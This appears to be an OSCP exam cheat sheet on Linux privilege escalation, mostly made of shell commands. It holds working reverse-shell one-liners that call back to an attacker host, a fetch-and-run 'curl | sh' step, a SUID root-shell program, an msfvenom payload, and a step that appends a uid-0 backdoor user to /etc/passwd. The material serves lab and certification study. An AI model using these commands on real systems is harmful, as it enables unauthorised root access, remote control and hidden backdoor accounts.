Linux Local Privilege Escalation · OSCP

You've got a shell.
Now climb to root.

You land on a Linux box as a weak user — often www-data from a web shell, or a low login. Privilege escalation is the climb up to root (uid 0), the account that owns the machine. This is your field manual: the method, the mindmap, and every ladder with real commands and the variations to reach for when the first one fails.

EXAM TOOLING RULES — read once, don't lose points

  • Allowed on every target: manual exploitation, msfvenom (payloads), linpeas / lse.sh / pspy / linux-exploit-suggester (enumeration), GTFOBins (it's just a reference site), public PoCs you compile and run yourself, nc, socat, chisel.
  • Metasploit framework + Meterpreter: one single machine for the whole exam. Don't spend it on a sudo or SUID win you could do by hand.
  • Banned: automated exploitation & mass scanners — sqlmap, Nessus/Nexpose, any auto-exploit tool.
  • Bottom line: Linux privesc is almost always a misconfiguration you root manually. Compile kernel exploits offline and static (gcc -static), and treat them as the last resort — the gentle wins below are the exam's bread and butter.

First 60 seconds on the box

Get a real shell, then your tools

A web shell is half-blind: no tab-complete, no arrow keys, and Ctrl-C kills it. Upgrade to a proper TTY first — then pull linpeas and pspy across. Host a web server on your attack box to serve them.

Stabilise the shell (do this first)
pty-upgrade.sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z to background
stty raw -echo; fg          # back in, now full TTY
export TERM=xterm           # clear + arrow keys work
On Kali — serve & catch
attacker.sh
python3 -m http.server 80      # serve your tools
rlwrap nc -lvnp 443            # catch the shell
On target — pull tools down
download.sh
wget http://KALI/linpeas.sh -O /tmp/l.sh
curl http://KALI/pspy64 -o /tmp/pspy
# fileless: run without touching disk
curl http://KALI/linpeas.sh | sh
chmod +x /tmp/l.sh && /tmp/l.sh
No network / writable spots
fallback.sh
# paste a small file as base64
echo <base64> | base64 -d > /tmp/t

Reverse shells & root payloads

Shell cookbook

The one-liners to get a callback, and the tiny C program you compile for NFS and shared-library tricks. Use a non-Meterpreter listener to stay clear of the Metasploit restriction.

Reverse shell one-liners
revshell.sh
# bash
bash -i >& /dev/tcp/KALI/443 0>&1
# nc without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc KALI 443 >/tmp/f
# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("KALI",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
SUID C payload (NFS / lib hijack)
root.c
// root.c — runs /bin/bash as owner
int main(){ setuid(0); setgid(0);
  system("/bin/bash -p"); }
# compile static, set the SUID bit as root
gcc root.c -o rootsh -w
chmod +s rootsh   # then: ./rootsh
msfvenom (allowed everywhere)
msfvenom.sh
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=KALI LPORT=443 -f elf -o shell.elf
No reverse shell? Add a root user
addroot.sh
# hash a password, append a uid-0 user
openssl passwd -1 -salt x pass123
echo 'r00t:HASH:0:0::/root:/bin/bash' >> /etc/passwd
su r00t   # often cleaner than a callback

Learn from others' wasted hours

Traps that eat exam time

These are the mistakes that cost points. Read them now so you recognise them at 2 a.m. during the exam.

🕳️ Kernel exploit first

The trap: you see an old uname -r and immediately hunt a kernel exploit. Why it hurts: they're unreliable and can panic the box. Kernel exploits are a last resort, after sudo / SUID / cron / caps are ruled out.

⏭️ Skimming linpeas

The trap: linpeas printed a wall of colour so you only chase the red. Why it hurts: the intended path is often a yellow finding. Read it slowly; the box is telling you the answer.

⌛ Forgetting to stabilise

The trap: fighting a dumb web shell — no tab, no Ctrl-C, editors break. Why it hurts: you waste time and mistype exploits. Upgrade the TTY first (python pty + stty raw).

🐚 Dropping the -p

The trap: a SUID bash gives a shell but id still shows your user. Why it hurts: bash drops privileges by default — you need bash -p / sh -p to keep the effective uid.

👁️ Not watching with pspy

The trap: crontab -l is empty so you assume no cron. Why it hurts: root's cron isn't in your crontab. Run pspy to watch root processes and timers fire live.

📸 No proof screenshot

The trap: you get root, grab the flag, move on — then realise you never captured proof. Why it hurts: a point you can't evidence is a point you didn't earn. Screenshot id + flag + your IP before anything else.
